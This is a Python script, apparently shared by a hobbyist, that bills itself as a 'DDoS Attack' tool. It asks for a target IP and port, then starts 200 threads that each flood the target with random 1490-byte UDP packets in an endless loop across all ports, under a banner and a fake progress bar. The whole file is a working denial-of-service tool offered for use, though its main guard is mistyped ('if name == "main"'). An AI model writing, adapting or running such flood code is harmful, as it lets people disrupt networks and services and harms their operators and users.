import os
import time
import socket
import random
import threading
from datetime import datetime

# Colors
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Display Banner
def print_banner():
    os.system("clear")
    os.system("figlet DDos Attack")
    print(f"{CYAN}Author: mhmd-error{RESET}")
    print(f"{CYAN}GitHub: https://github.com/mhmd138az{RESET}")
    print(f"{YELLOW}==============================={RESET}")
    print()

# Show progress bar
def show_progress():
    print(f"{CYAN}[====================] 0%{RESET}")
    time.sleep(1)
    print(f"{CYAN}[=====               ] 25%{RESET}")
    time.sleep(1)
    print(f"{CYAN}[==========          ] 50%{RESET}")
    time.sleep(1)
    print(f"{CYAN}[===============     ] 75%{RESET}")
    time.sleep(1)
    print(f"{CYAN}[====================] 100%{RESET}")
    time.sleep(2)

# Send packets function
def send_packets(ip, port, sock, bytes):
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        if port > 65535:
            port = 1
        os.system("clear")
        print(f"{RED}DDoS Attack in Progress...{RESET}")
        print(f"{YELLOW}Sent {sent} packets to {ip} through port {port}{RESET}")
        time.sleep(0.1)

# Start the attack
def start_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    threads = []

    # Start banner and progress bar
    print_banner()
    show_progress()
    
    # Start threads for attack
    print(f"{RED}Attack Starting...{RESET}")
    for _ in range(200):  # Using 200 threads
        thread = threading.Thread(target=send_packets, args=(ip, port, sock, bytes))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Main function
def main():
    ip = input(f"{GREEN}Enter Target IP: {RESET}")  # For Python 3
    port = int(input(f"{GREEN}Enter Target Port: {RESET}"))  # For Python 3
    start_attack(ip, port)

if name == "main":
    main()
